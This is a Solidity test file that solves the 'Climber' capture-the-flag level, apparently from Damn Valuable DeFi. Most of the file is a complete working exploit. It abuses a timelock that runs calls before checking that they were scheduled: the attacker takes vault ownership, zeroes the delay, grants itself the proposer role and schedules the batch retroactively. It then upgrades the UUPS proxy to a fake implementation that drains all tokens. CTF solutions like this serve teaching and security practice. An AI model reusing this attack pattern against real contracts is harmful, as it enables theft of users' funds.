// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        ClimberAttacker climberAttacker =
            new ClimberAttacker(address(climberVaultProxy), address(dvt), payable(address(climberTimelock)));
        climberAttacker.attack(); // First: get ownership. Second: updateDelay. Third: grant proposer role. Forth: call schedule.
        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}

contract ClimberAttacker {
    address climberVaultProxy;
    address dvt;
    address payable climberTimelock;
    address attacker;
    FakeClimberVault fakeClimberImplementation;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);
    bytes32 salt = "";

    constructor(address climberVaultProxy_, address dvt_, address payable climberTimelock_) {
        climberVaultProxy = climberVaultProxy_;
        dvt = dvt_;
        climberTimelock = climberTimelock_;
        attacker = msg.sender;

        targets[0] = climberVaultProxy;
        targets[1] = climberTimelock;
        targets[2] = climberTimelock;
        targets[3] = address(this);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[2] =
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
        dataElements[3] = abi.encodeWithSignature("scheduleBeforeExecution()");
    }

    function attack() external payable {
        ClimberTimelock(climberTimelock).execute(targets, values, dataElements, salt);
        fakeClimberImplementation = new FakeClimberVault();
        ClimberVault(climberVaultProxy).upgradeTo(address(fakeClimberImplementation));
        FakeClimberVault(climberVaultProxy).exploit(dvt, attacker);
    }

    function scheduleBeforeExecution() external {
        ClimberTimelock(climberTimelock).schedule(targets, values, dataElements, salt);
    }
}

contract FakeClimberVault is ClimberVault {
    function exploit(address dvt, address to) external {
        IERC20(dvt).transfer(to, IERC20(dvt).balanceOf(address(this)));
    }
}
